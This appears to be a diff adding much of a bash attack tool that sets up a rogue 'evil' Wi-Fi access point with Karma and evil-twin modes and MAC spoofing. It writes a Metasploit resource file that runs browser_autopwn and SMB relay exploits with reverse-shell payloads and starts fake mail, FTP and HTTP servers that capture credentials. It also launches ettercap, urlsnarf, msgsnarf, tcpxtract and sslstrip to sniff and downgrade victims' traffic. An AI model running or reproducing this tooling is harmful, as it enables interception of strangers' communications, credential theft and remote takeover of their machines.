+	echo -e ""$CYAN"Changing MAC of interface $1 to: $2"$END""
+	if [ "x$1" = "x" ] || [ $1 = "NONE" ]; then echo -en ""$RED"No wireless interface provided!"$END" Press <CR>"; read blah; return 1; fi #missing Parameter
+	#Which wireless chipset do we have....
+	get_wifi_driver $1
+   	#wifichip=`$airmon | grep -v VAP | grep $1 | awk '{print $2}'`
+   	#What's the driver
+   	#wifidriver=`$airmon | grep $1 | awk '{print $3}'`
+	case $wifichip in 
+	'Atheros' ) #Atheros interfaces 
+	#     if [ $wifidriver = ath9k ]; then
+	#        echo bla 
+
+	    # else
+		cleanup_system $wifi
+		ifconfig $1 down
+		if [ "$2" = "" ]; then echo -en ""$RED"No MAC or parameter [RANDOM] provided, won't change MAC address!"$END" Press <CR>"; read blah; return 1
+		elif [ "$2" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+			macchanger -r $1;
+		else echo Setting MAC: $2
+			macchanger --mac=$2 $1; 
+		fi
+		echo "No VAP has been created yet! "
+	   #  fi
+		;;
+	'Ralink') 
+		ifconfig $1 down
+		if [ "$2" = "" ]; then echo -en ""$RED"No MAC or parameter [RANDOM] provided, won't change MAC address!"$END" Press <CR>"; read blah; return 1
+		elif [ "$2" = "RANDOM" ]; then echo Setting random MAC address
+			macchanger -r $1;
+		else echo Setting MAC: $2
+			macchanger --mac=$2 $1; 
+		fi
+		ifconfig $1 up
+		;;
+	'dummy')
+		echo -e ""$RED"You can't change the MAC address on a $1 interface!"$END" "; return 1
+		;;
+	*) 
+	        echo -e ""$RED"No suitable interface found!"$END""
+	        read blah
+	        return 1
+	;;esac
+echo -e ""$GREEN"Changing MAC done."$END""
+return 0
+}
+
+
+
+######## Read the wireless config files ########
+readconfig()
+{
+	# Creating conf file list
+	echo -e "Building wireless configurations list from: "$BLUE"$CONFDIR"$END""
+	i=0
+	for f in $CONFDIR/*.wifi; do
+		i=`expr $i + 1`
+		g=`basename $f` 
+		g=`basename $g ".wifi"`
+		echo "$i) $g"
+	done
+	echo "0) Main Menu"
+	echo ""
+	ap=0
+	echo -en ""$MAGENTA"Select wireless configuration: "$END""
+	read ap
+	if [ "x$ap" = "x" ]; then return 1; fi
+	if [ "$ap" -eq 0 ]; then return 1; fi 
+	if [ "$ap" -le $i ]; then  
+		# let's get the conf file
+		i=0
+		usedconfig=""
+		for f in $CONFDIR/*.wifi; do
+			i=`expr $i + 1`
+			if [ $i -eq $ap ]; then usedconfig=$f; fi
+		done	
+		echo -e "Using "$BLUE"$usedconfig"$END" as config file"
+		# Grabbing the juicy info off the config file
+		echo -e ""$CYAN"Extracting configuration off the config file"$END""
+		IP="DHCP"; MASK="DHCP";GW="DHCP"; DNS="DHCP"; MYCLIENTMAC="NONE";SSID="WLAN"; CHANNEL=" "; BSSID=""; KEYMGMT="OPEN"; KEY="NONE";CLIENTMAC01="NONE";
+		while read line; do
+		   foo=`echo $line | grep "^##"`
+		   #Is there any comment we can use?
+		   if [ $? -eq 0 ]; then
+			line=`echo $line | sed s/##//`
+			var=`echo $line | cut -f1 -d=`
+			value=`echo $line | cut -f2 -d=`
+			case $var in
+				'IP' )
+				IP=$value
+				;; 
+				'MASK' )
+				MASK=$value
+				;; 
+				'GW' )
+				GW=$value
+				;; 
+				'DNS' )
+				DNS=$value
+				;; 
+				'MYCLIENTMAC' )
+				MYCLIENTMAC=$value
+				;;
+				'CHANNEL' )
+				CHANNEL=$value
+				;;
+				'CLIENTMAC01' )
+				CLIENTMAC01=$value
+				;;
+			esac
+		  else
+		     foo=`echo $line | grep "^ssid"`
+		     if [ $? -eq 0 ]; then
+			  line=`echo $line | sed s/^ssid=//`
+			  var=`echo $line | cut -f1 -d=`
+			  SSID=`echo $line | cut -f2 -d=`
+		     fi
+		     foo=`echo $line | grep "^psk"`
+		     if [ $? -eq 0 ]; then
+			  line=`echo $line | sed s/^psk=//`
+			  var=`echo $line | cut -f1 -d=`
+			  KEY=`echo $line | cut -f2 -d=`
+		     fi
+		     foo=`echo $line | grep "^wep_key"`
+		     if [ $? -eq 0 ]; then
+			  line=`echo $line | sed s/^wep_key.=//`
+			  var=`echo $line | cut -f1 -d=`
+			  KEY=`echo $line | cut -f2 -d=`
+		     fi
+		     foo=`echo $line | grep "^key_mgmt="`
+		     if [ $? -eq 0 ]; then
+			  line=`echo $line | sed s/^key_mgmt=//`
+			  var=`echo $line | cut -f1 -d=`
+			  KEYMGMT=`echo $line | cut -f2 -d=`
+		     fi
+		     foo=`echo $line | grep "^bssid="`
+		     if [ $? -eq 0 ]; then
+			  line=`echo $line | sed s/^bssid=//`
+			  var=`echo $line | cut -f1 -d=`
+			  BSSID=`echo $line | cut -f2 -d=`
+		     fi
+		  fi
+		done < $usedconfig
+		echo -e "Loaded configuration:"
+		echo "IP:$IP Netmask:$MASK Gateway:$GW "
+		echo "Name Server:$DNS "
+		echo "MAC to be spoofed:$MYCLIENTMAC "
+		echo "AP's SSID: $SSID"
+		echo "CHANNEL:$CHANNEL "
+		echo "AP's BSSID: $BSSID"
+		echo "Key management: $KEYMGMT with key :$KEY"
+		echo "Client MAC:$CLIENTMAC01"
+		return 0 #  everything OK
+	else echo -e ""$RED"No file found!"$END""
+		return 1 # Houston, we got a .....
+	fi	
+}	
+
+#Function for launching Metasploit
+function run_karmetasploit ()
+{
+echo -e ""$CYAN"Starting Karmetasploit in the background "$END""
+echo Stay patient, this will take quite a while...
+echo checkout the screens section of the main menu
+if [ ! -e $KARMETASPLOITCONF ]; then
+ echo -e ""$CYAN"Creating temporary Karmetasploit resource file"$END""
+ echo "load db_sqlite3" > $KARMETASPLOITCONF
+ echo "db_create $KARMETASPLOITLOG_$NOW.db" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/browser_autopwn" >> $KARMETASPLOITCONF
+ echo "setg AUTOPWN_HOST $EVILAPNET.1" >> $KARMETASPLOITCONF
+ echo "setg AUTOPWN_PORT 55550" >> $KARMETASPLOITCONF
+ echo "setg AUTOPWN_URI /ads" >> $KARMETASPLOITCONF
+ echo "set LHOST EVILAPNET.1" >> $KARMETASPLOITCONF
+ echo "set LPORT 45000" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 55550" >> $KARMETASPLOITCONF
+ echo "set URIPATH /ads" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use exploit/windows/smb/smb_relay" >> $KARMETASPLOITCONF
+ echo "set PAYLOAD windows/shell/reverse_tcp" >> $KARMETASPLOITCONF
+ echo "set LHOST $EVILAPNET.1" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 139" >> $KARMETASPLOITCONF
+ echo "set LPORT 1390" >> $KARMETASPLOITCONF
+ echo "exploit" >> $KARMETASPLOITCONF
+ echo "use exploit/windows/smb/smb_relay" >> $KARMETASPLOITCONF
+ echo "set PAYLOAD windows/shell/reverse_tcp" >> $KARMETASPLOITCONF
+ echo "set LHOST $EVILAPNET.1" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 445" >> $KARMETASPLOITCONF
+ echo "set LPORT 4450" >> $KARMETASPLOITCONF
+ echo "exploit" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/pop3" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 110" >> $KARMETASPLOITCONF
+ echo "set SSL false" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/pop3" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 995" >> $KARMETASPLOITCONF
+ echo "set SSL true" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/ftp" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/imap" >> $KARMETASPLOITCONF
+ echo "set SSL false" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 143" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/imap" >> $KARMETASPLOITCONF
+ echo "set SSL true" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 993" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/smtp" >> $KARMETASPLOITCONF
+ echo "set SSL false" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 25" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/smtp" >> $KARMETASPLOITCONF
+ echo "set SSL true" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 465" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/fakedns" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/http" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 80" >> $KARMETASPLOITCONF
+ echo "set BGIMAGE /msf3/load.gif" >> $KARMETASPLOITCONF
+ echo "set SSL false" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/http" >> $KARMETASPLOITCONF
+ echo "set SRVPORT $karmetasploit_websrv_port" >> $KARMETASPLOITCONF
+ echo "set BGIMAGE /msf3/load.gif" >> $KARMETASPLOITCONF
+ echo "set SSL false" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/http" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 443" >> $KARMETASPLOITCONF
+ echo "set BGIMAGE /msf3/load.gif" >> $KARMETASPLOITCONF
+ echo "set SSL true" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo "use auxiliary/server/capture/http" >> $KARMETASPLOITCONF
+ echo "set SRVPORT 8443" >> $KARMETASPLOITCONF
+ echo "set BGIMAGE /msf3/load.gif" >> $KARMETASPLOITCONF
+ echo "set SSL true" >> $KARMETASPLOITCONF
+ echo "run" >> $KARMETASPLOITCONF
+ echo -e ""$CYAN"Starting Metasploit"$MAGENTA""
+fi
+$screen -m -d -S Karmetasploit /pentest/exploits/framework3/msfconsole -r $KARMETASPLOITCONF && cleanup  >> $LOGFILE 2>&1
+
+} # end run_karmetasploit
+
+
+#DigiNinja Atheros Karma interface initialization
+#Partly taken from www.darkoperator.com. Check out for other awesome scripts!
+function start_evilap ()
+{
+ echo -e ""$CYAN"Starting evil access point"$END""
+ use_karma=no
+ use_hostap=no
+ karma_avail=no
+ hostap_avail=no
+ usethisint=$newint
+ get_wifi_driver $wifi
+ echo -en ""$MAGENTA"Which channel do you want to use [1-14]/<CR> for random?: "$END""
+ read chan 
+ if [ x"$chan" = "x" ]; then chan=RANDOM; fi;
+ if [ $DEBUG = "ON" ]; then echo "DEBUG: Picked channel: $chan"; fi
+ echo -en ""$MAGENTA"Which MAC address do you want to use [00:11:22:33:44:55]/RANDOM/<CR> for no change?: "$END""
+ read mac
+ if [ x"$mac" = "x" ]; then mac=""; fi;
+ if [ $DEBUG = "ON" ]; then echo "DEBUG: Picked MAC: $mac"; fi
+ echo -e ""$MAGENTA"Do you want to respond on any SSID (karma) or create an evil twin?"
+ echo -en "For any SSID just press <CR> / for evil twin provide the ESSID: "$END""
+ read use_eviltwin
+ if [ x$use_eviltwin = "x" ]; then use_eviltwin=no
+ else
+    SSID=$use_eviltwin
+    use_eviltwin=yes
+ fi
+ if [ $DEBUG = "ON" ]; then echo "DEBUG: use_eviltwin=$use_eviltwin SSID=$SSID"; fi
+ # Let's check for Karma patch
+
+ if [ x$wifichip = "xAtheros" ] || [ x$wifichip = "xRalink" ]; then  #test with ralink and hostap
+ #if [ x$wifichip = "xAtheros" ]; then
+    if [ $DEBUG = "ON" ]; then echo "DEBUG: creating interface on channel $chan"; fi
+    if [ $DEBUG = "ON" ]; then echo "DEBUG: Picked channel: $chan"; fi
+    # Karma needs an AP interface, no monitoring interface
+    create_wireless_interface $wifi ap $chan $mac
+    if [ $? != 0 ]; then echo -e ""$RED"Something went wrong! Cannot create access point interface."$END""; fi	
+    echo Checking for Karma patched hostap availability
+    if [ -f $HOSTAPD ]; then
+       strings $HOSTAPD | grep Karma
+       if [ $? -eq 0 ]; then
+          echo -e ""$GREEN"Good Karma found. Patched hostap driver available"$END""
+	  hostap_avail=yes
+       fi
+    fi
+    echo Checking for Karma patched madwifi-ng drivers for $newint
+    $iwpriv $newint karma 1       # Enable KARMA mode
+    #$iwpriv $newint karma 1 >> $LOGFILE 2>&1  # Enable KARMA mode
+    if [ $? -eq 0 ] ; then
+       echo -e ""$GREEN"Good Karma found. Patched madwifi-ng driver available"$END""
+       karma_avail=yes
+    fi
+    if [ $DEBUG = "ON" ]; then echo "DEBUG: karma_avail=$karma_avail hostap_avail=$hostap_avail"; fi
+
+    if [ x$karma_avail = "xyes" ] && [ x$hostap_avail = "xyes" ]; then
+       echo -en ""$MAGENTA"Use [D]igininja's patched madwifi-ng drivers, [h]ostap or [a]irbase-ng [D/h/a]: "$END""
+       read blah
+    elif [ x$karma_avail = "xyes" ] && [ x$hostap_avail = "xno" ]; then
+       echo -en ""$MAGENTA"Use [D]igininja's patched madwifi-ng drivers or [a]irbase-ng [D/a]: "$END""
+       read blah
+    elif [ x$karma_avail = "xno" ] && [ x$hostap_avail = "xyes" ]; then
+       echo -en ""$MAGENTA"Use [h]ostap or [a]irbase-ng [h/a]: "$END""
+       read blah
+    fi
+    if [ x$blah = "xD" ]; then
+       use_karma=yes
+    elif [ x$blah = "xh" ]; then
+         use_hostap=yes
+    else
+         echo -e "No Karma patched madwifi-ng drivers found!"
+         echo -e "Checkout www.digininja.org for more info on that"
+    fi 
+ fi
+ if [ $use_karma = yes ]; then
+     ####				####
+     ####      Digininja Karma style    ####
+     ####				####
+     if [ $DEBUG = "ON" ]; then echo "DEBUG: newint:$newint and karma = yes"; fi 
+     echo -e ""$CYAN"Starting evil access point using Digininja's patched Karma drivers"$END""
+     echo -e "Configuring interface $newint "
+     usethisint=$newint
+     $iwconfig $newint essid "$SSID"
+     $iwconfig $newint mode master >> $LOGFILE 2>&1 #this fails mostly, but doesn't harm
+     ifconfig $newint up $EVILAPNET.1 netmask 255.255.255.0
+     if [  x$use_eviltwin = "xyes" ]; then
+	echo "Evil twin option chosen. Switching off good karma"
+	$iwpriv $newint karma 0       # Disabling KARMA mode
+      fi
+        
+	
+ elif [ $use_hostap = yes ]; then
+     ####                               ####
+     ####      Hostap Karma style       ####
+     ####                               ####
+     if [ $DEBUG = "ON" ]; then echo "DEBUG: newint:$newint and hostap = yes"; fi
+     echo -e ""$CYAN"Starting evil access point using Digininja's patched hostap drivers"$END""
+     if [ $wifichip = "Ralink" ]; then echo -e ""$RED"Warning: Hostap mode with Ralink USB devices might not work properly!"$END""; fi
+     echo -e "Configuring interface $newint "
+     # No monitoring mode interface required
+     create_wireless_interface $wifi station $chan $mac   #sets $newint
+     usethisint=$newint
+     echo -e "Creating "$BLUE"$HOSTAPDCONF"$END" file on the fly"
+     echo "interface=$usethisint"> $HOSTAPDCONF
+     echo "driver=nl80211">> $HOSTAPDCONF
+     echo "ssid=$SSID">> $HOSTAPDCONF
+     ## Sorry for the channel stuff, but a valid channel number is mandatory
+     if [ x$chan = "xRANDOM" ]; then echo "channel=$[ ( $RANDOM % 11 )  + 1 ]">> $HOSTAPDCONF; else echo "channel=$chan" >> $HOSTAPDCONF; fi
+	# Both open and shared auth
+     echo "auth_algs=3">> $HOSTAPDCONF
+	# no SSID cloaking
+     echo "ignore_broadcast_ssid=0">> $HOSTAPDCONF
+	# -1 = log all messages
+     echo "logger_syslog=-1">> $HOSTAPDCONF
+     echo "logger_stdout=-1">> $HOSTAPDCONF
+	# 2 = informational messages
+     echo "logger_syslog_level=2">> $HOSTAPDCONF
+     echo "logger_stdout_level=2">> $HOSTAPDCONF
+	# Dump file for state information (on SIGUSR1)
+	# example: kill -USR1 <pid>
+     echo "dump_file=$TMP/hostapd.dump">> $HOSTAPDCONF
+     echo "ctrl_interface=/var/run/hostapd">> $HOSTAPDCONF
+     echo "ctrl_interface_group=0">> $HOSTAPDCONF
+	# 0 = accept unless in deny list
+     echo "macaddr_acl=0">> $HOSTAPDCONF
+      	# only used if you want to do filter by MAC address
+     if [ -e $EVILAPACCEPT ]; then
+        echo -e "Found "$BLUE"$EVILAPACCEPT"$END""
+	echo "Add MACs which will be accepted by our evil AP. Default: all, if not existing"
+	#Absolut dir names are better here
+	dir1=`dirname $EVILAPACCEPT`
+        name1=`basename $EVILAPACCEPT`
+        dirabsolut=`cd $dir1; pwd `/$name1
+	if [ $DEBUG = "ON" ]; then echo "DEBUG: dirabsolut=$dirabsolut"; fi
+	echo "accept_mac_file=$dirabsolut" >> $HOSTAPDCONF
+     fi
+     if [ -e $EVILAPDENY ]; then
+        echo -e "Found "$BLUE"$EVILAPDENY"$END""
+	echo "Add MACs which will be denied by your evil AP. Default: none, if not existing"
+	#Absolut dir names are better here
+        dir1=`dirname $EVILAPDENY`
+        name1=`basename $EVILAPDENY`
+        dirabsolut=`cd $dir1; pwd `/$name1
+        if [ $DEBUG = "ON" ]; then echo "DEBUG: dirabsolut=$dirabsolut"; fi
+        echo "deny_mac_file=$dirabsolut" >> $HOSTAPDCONF
+     fi
+     if [ $use_eviltwin = "yes" ]; then
+	echo "Evil twin option chosen. Switching off good karma"
+        echo "enable_karma=0">> $HOSTAPDCONF
+     else
+	# enable Karma
+     	echo "enable_karma=1">> $HOSTAPDCONF
+     fi
+
+
+     echo "hostapd will start in the background. "
+     echo "This will take some seconds .............."
+     if [ $DEBUG = "ON" ]; then echo "DEBUG:newint:$newint"; fi
+     $screen -m -d -S hostapd_evilap_on_$newint $HOSTAPD -dd $HOSTAPDCONF
+     sleep 10
+     ps -eaf | grep hostapd-ng_evilap_on_$newint >> $LOGFILE 2>&1
+     if [ $? -eq 1 ] ; then
+    	   echo -e ""$RED"Failed to start AP. Check the logs "$END""
+    	   return 1
+     else 
+           echo "Check out the screens section of the main menu."
+     fi
+     ifconfig $newint up $EVILAPNET.1 netmask 255.255.255.0
+
+
+ else  # none Karma 
+     ####				####
+     ####      Airbase-ng style         ####
+     ####			        ####
+     echo -e ""$CYAN"Starting evil access point using airbase-ng"$END""
+     #echo "Please note: Karma+Madwifi is much more reliable"
+     if [ $DEBUG = "ON" ]; then echo "DEBUG: creating interface on channel $chan"; fi
+        create_wireless_interface $wifi monitor $chan $mac #sets $newint
+     	usethisint=at0
+     	if [ $DEBUG = "ON" ]; then echo "DEBUG: use_karma $use_karma, usethisint=$usethisint, newint $newint"; fi
+ 	if [ $DEBUG = "ON" ]; then echo "DEBUG: creating interface on channel $chan"; fi
+ 	modprobe tun
+	echo "Airbase-ng will start in the background. "
+ 	echo "This will take 15 seconds .............."
+ 	if [ $DEBUG = "ON" ]; then echo "DEBUG:newint:$newint use_eviltwin=$use_eviltwin"; fi
+  	if [ $use_eviltwin = "yes" ]; then
+           echo "Evil twin option chosen. Not using good karma"
+	   if [ -e $EVILAPDENY ]; then
+       	      echo -e "Found "$BLUE"$EVILAPDENY"$END""
+              echo "Clients with MACs in here will be denied by your evil AP"
+	      echo "This is useful to block your own wireless clients"
+              #Absolut dir names are better here
+              dir1=`dirname $EVILAPDENY`
+              name1=`basename $EVILAPDENY`
+              dirabsolut=`cd $dir1; pwd `/$name1
+              if [ $DEBUG = "ON" ]; then echo "DEBUG: dirabsolut=$dirabsolut"; fi
+ 	      $screen -m -d -S airbase-ng_evilap_on_$newint $airbase -C 60 -e "$SSID" -v $newint -f disallow --bssids $dirabsolut  >> $LOGFILE 2>&1
+	   else
+
+ 	   $screen -m -d -S airbase-ng_evilap_on_$newint $airbase -C 60 -e "$SSID" -v $newint >> $LOGFILE 2>&1
+	   fi
+
+        else
+
+	   ##
+           # with Karma
+	   ##
+	   if [ -e $EVILAPDENY ]; then
+              echo -e "Found "$BLUE"$EVILAPDENY"$END""
+              echo "Clients with MACs in here will be denied by your evil AP"
+              echo "This is useful to block your own wireless clients"
+              #Absolut dir names are better here
+              dir1=`dirname $EVILAPDENY`
+              name1=`basename $EVILAPDENY`
+              dirabsolut=`cd $dir1; pwd `/$name1
+              if [ $DEBUG = "ON" ]; then echo "DEBUG: dirabsolut=$dirabsolut"; fi
+              $screen -m -d -S airbase-ng_evilap_on_$newint $airbase -P -C 60 -e "$SSID" -v $newint -f disallow --bssids $dirabsolut  >> $LOGFILE 2>&1
+           else
+ 	   $screen -m -d -S airbase-ng_evilap_on_$newint $airbase -P -C 60 -e "$SSID" -v $newint >> $LOGFILE 2>&1
+	   fi
+     	fi
+ 	sleep 10
+	ps -eaf | grep airbase-ng_evilap_on_$newint >> $LOGFILE 2>&1
+ 	if [ $? -eq 1 ] ; then
+    	   echo -e ""$RED"Failed to start AP. Make sure you have the latest version of Aircrack-ng"$END""
+    	   echo -e ""$RED"and that your wireless cards supports injection."$END""
+    	   return 1
+ 	else 
+           echo "Check out the screens section of the main menu."
+ 	fi
+ 	#give enough time before next command for interface to come up
+ 	#specialy on Virtual Machines with USB cards
+ 	echo -e "Changing MTU Size for at0 to 1400"
+ 	ifconfig at0 mtu 1400
+ 	ifconfig at0 $EVILAPNET.1 netmask 255.255.255.0
+     	echo -e "Changing MTU Size for $newint to 1800"
+     	ifconfig $newint mtu 1800
+     	echo -e "Changing MTU Size for $wifi to 1800"
+     	ifconfig $wifi mtu 1800
+ fi #else none karma 
+
+ ####				              ####
+ #### Setting up router and starting Ettercap ####
+ ####					      ####
+
+ if [ $DEBUG = "ON" ]; then echo "DEBUG: use_karma $use_karma, usethisint=$usethisint, newint $newint"; fi
+ echo -e "Killing all proccesses listening on port 80,443..."
+ kill `netstat -lpt | grep www | awk '{print $7}' | sed -e 's/\/[a-zA-Z0-9]*//'` >> $LOGFILE 2>&1
+ kill `netstat -lpt | grep https | awk '{print $7}' | sed -e 's/\/[a-zA-Z0-9]*//'` >> $LOGFILE 2>&1
+  
+ start_router
+
+ #Depending on your choice the fun stuff below is not used when using Karmetasploit
+ if [ $karmetasploitchosen = "no" ]; then
+
+
+ if [ -f $ettercap ]; then
+    echo -e ""$CYAN"Starting ettercap for passive sniffing in the background."$END""
+    #echo -e "Check out the screens section of the main menu."
+    #give enough time before next command for interface to come up. Required for ettercap
+    echo "This will take 15 seconds .............."
+    sleep 10
+    if [ $DEBUG = "ON" ]; then echo "DEBUG:newint:$newint"; fi
+    if [ -f ${LOGFOLDER}ettercap_evilap.log ]; then 
+	echo "Found old ettercap_evilap log file."
+	echo "Moving it to ${LOGFOLDER}ettercap_evilap_${NOW}.log"
+	mv ${LOGFOLDER}ettercap_evilap.log ${LOGFOLDER}ettercap_evilap_${NOW}.log
+    fi # Problem is, Ettercap can't append to an existing logfile
+    echo "####################################################" >> ${LOGFOLDER}ettercap_evilap.log 
+    echo "#######       Ettercap Log started $NOW      #######" >> ${LOGFOLDER}ettercap_evilap.log 
+    echo "####################################################" >> ${LOGFOLDER}ettercap_evilap.log 
+    ## Ettercap Option
+    ## -T    text only interface
+    ## -q    quite mode, don't display packets itself
+    ## -p    don't use promiscous mode on interface
+    ## -u    unoffensive, use kernel packet forwarding functionalit
+    ## -m <file>   write logfile
+    ## -i <int>   use interface 
+    ## -z    Do not perform the initial ARP scan of the LAN
+    ## -P <plugin>  load plugin e.g.:  autoadd
+
+    ## attempt with dhcp mitm attack, DNS server IP at the end
+    #ettercap -T -q -p -z -i at0 -P autoadd -M dhcp:192.168.0.30,35,50-60/255.255.255.0/10.0.33.1
+
+   $screen -m -d -S ettercap_evilap_on_$usethisint $ettercap -T -q -p -u -z -m ${LOGFOLDER}ettercap_evilap.log -i $usethisint >> $LOGFILE 2>&1
+
+    sleep 2
+    if [ -f ${LOGFOLDER}ettercap_evilap.log ] ; then
+       echo -e ""$GREEN"ettercap started succesfully"$END"" 
+       echo -e "Ettercap is logging to:  "$BLUE"${LOGFOLDER}ettercap.cap"$END""
+    else 
+       echo -e ""$RED"ettercap could not be started"$END""
+    fi
+ else
+    echo -e ""$RED"Can't find $ettercap."$END""
+    echo "You might want to check out: http://ettercap.sourceforge.net"
+ fi #if ettercap
+		#############################
+		##  Running the fun stuff  ##
+		#############################
+
+
+# Not using dsniff for password gathering but using ettercap
+# echo -e ""$CYAN"Starting dsniff "$END" "
+# echo "####################################################" >> ${LOGFOLDER}dsniff.log
+# echo "#######       dsniff log started $NOW      "          >> ${LOGFOLDER}dsniff.log
+# echo "####################################################" >> ${LOGFOLDER}dsniff.log
+# echo "Note: http clear text passwords can be found in the sslstrip log though!"
+# if [ $DEBUG = "ON" ]; then echo "DEBUG: $dsniff  -m -i $usethisint >> ${LOGFOLDER}dsniff.log &"; fi
+# $screen -dmS dsniff_evilap_on_$usethisint $dsniff  -m -n -i $usethisint >> ${LOGFOLDER}dsniff.log 
+# sleep 3
+# if [ -f ${LOGFOLDER}dsniff.log ] ; then
+#   echo -e ""$GREEN"dsniff started succesfully"$END""
+#   echo -e "dsniff is logging to: "$BLUE"${LOGFOLDER}dsniff.log"$END""
+# fi
+
+
+ echo -e ""$CYAN"Starting urlsnarf "$END" "
+ echo "####################################################" >> ${LOGFOLDER}urlsnarf.log
+ echo "#######       urlsnarf log started $NOW      "        >> ${LOGFOLDER}urlsnarf.log
+ echo "####################################################" >> ${LOGFOLDER}urlsnarf.log
+ #$screen -m -d -S urlsnarf_evilap_on_$usethisint $urlsnarf  -i $usethisint >> ${LOGFOLDER}urlsnarf.log
+ # Output redirection does not work with screen, using nohup instead
+ echo -e ""$RED"Note: Using nohup instead of screen to start urlsnarf."$END""
+ echo -e "Use e.g. tail -f to check logfile"
+ #$urlsnarf  -i $usethisint >> ${LOGFOLDER}urlsnarf.log &
+ nohup $urlsnarf  -i $usethisint >> ${LOGFOLDER}urlsnarf.log  2> /dev/null < /dev/null & 
+ sleep 3
+ if [ -f ${LOGFOLDER}urlsnarf.log ] ; then
+   echo -e ""$GREEN"urlsnarf started succesfully"$END""
+   echo -e "urlsnarf is logging to: "$BLUE"${LOGFOLDER}urlsnarf.log"$END""
+ fi
+
+
+ echo -e ""$CYAN"Starting msgsnarf "$END" "
+ echo "####################################################" >> ${LOGFOLDER}msgsnarf.log
+ echo "#######       msgsnarf log started $NOW  " >> ${LOGFOLDER}msgsnarf.log
+ echo "####################################################" >> ${LOGFOLDER}msgsnarf.log
+ #$screen -m -d -S msgsnarf_evilap_on_$usethisint $msgsnarf  -i $usethisint >> ${LOGFOLDER}msgsnarf.log
+ #I don't get the output redirected when running in a screen windows
+ echo -e ""$RED"Note: Using nohup instead of screen to start msgsnarf."$END""
+ echo -e "Use e.g. tail -f to check logfile"
+ nohup $msgsnarf  -i $usethisint >> ${LOGFOLDER}msgsnarf.log 2> /dev/null < /dev/null & 
+ sleep 3
+ if [ -f ${LOGFOLDER}msgsnarf.log ] ; then
+    echo -e ""$GREEN"msgsnarf started succesfully"$END""
+    echo -e "msgsnarf is logging to: "$BLUE"${LOGFOLDER}msgsnarf.log"$END""
+ fi
+
+
+ echo -e ""$CYAN"Starting tcpxtract "$END" "
+ ###################################################
+ #######      starting tcpxtract
+ ###################################################
+ mkdir ${LOGFOLDER}tcpxtract-output >> $LOGFILE 2>&1
+ $screen -m -d -S tcpxtract_evilap_on_$usethisint $tcpxtract  -d $usethisint --output ${LOGFOLDER}tcpxtract-output
+ echo -e ""$GREEN"tcpxtract started "$END""
+ echo -e "tcpxtract stores files here: "$BLUE"${LOGFOLDER}tcpxtract-output"$END""
+
+ ###################################################
+ #######      sslstrip or middler
+ ###################################################
+
+ blah=s
+ echo -en ""$MAGENTA"Start sslstrip, TheMiddler or none [s/t/n]: "$END""
+ read blah
+ if [ x$blah = "xs" ]; then
+   echo -e ""$CYAN"Starting sslstrip "$END" "
+   if [ -f ${LOGFOLDER}sslstrip.log ]; then
+     echo "Found old sslstrip log file."
+     echo "Moving it to ${LOGFOLDER}sslstrip${NOW}.log"
+     mv ${LOGFOLDER}sslstrip.log ${LOGFOLDER}sslstrip${NOW}.log
+   fi # Problem is, sslstrip can't append to an existing logfile
+   echo "####################################################" >> ${LOGFOLDER}sslstrip.log
+   echo "#######       sslstrip log started $NOW      " >> ${LOGFOLDER}sslstrip.log
+   echo "####################################################" >> ${LOGFOLDER}sslstrip.log
+   echo "Forwarding traffic on port 80 to sslstrip listening on port $sslstrip_lst_port"
+   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $sslstrip_lst_port 
+   #iptables -t nat -A PREROUTING -p tcp --destination-port 444 -j REDIRECT --to-port $sslstrip_lst_port 
+   ## Log all (-a) SSL traffic, (-l) listen on port ..., (-f) substitute lock favicon, (-k) kill sessions in progress, (-w) write log file
+   $screen -dmS sslstrip_evilap python $sslstrip  -k -f -l $sslstrip_lst_port -w ${LOGFOLDER}sslstrip.log >> $LOGFILE 2>&1
+   sleep 3
+   if [ -f ${LOGFOLDER}sslstrip.log ] ; then
+     echo -e ""$GREEN"sslstrip started succesfully"$END""
+     echo -e "sslstrip is logging to: "$BLUE"${LOGFOLDER}sslstrip.log"$END""
+   else
+     echo -e ""$RED"${LOGFOLDER}sslstrip.log not found, sslstrip probably not running."$END""
+   fi  #sslstrip started?
+ ###################################################
+###################################################
+ #######      starting the middler
+ ###################################################
+ elif [ x$blah = "xt" ]; then
+   echo -e ""$CYAN"Starting TheMiddler "$END""
+   echo "You need to modify / enable plugins to make this an effective tool!"
+   $screen -dmS TheMiddler_evilap python2.6 $TheMiddler -p $middler_lst_port -A  >> $LOGFILE 2>&1
+ else
+   echo "Nor sslstrip or TheMiddler have been started"
+ fi #sslstrip or TheMiddler
+
+	 ####################################################
+	 #######       Sidejacking Tools below
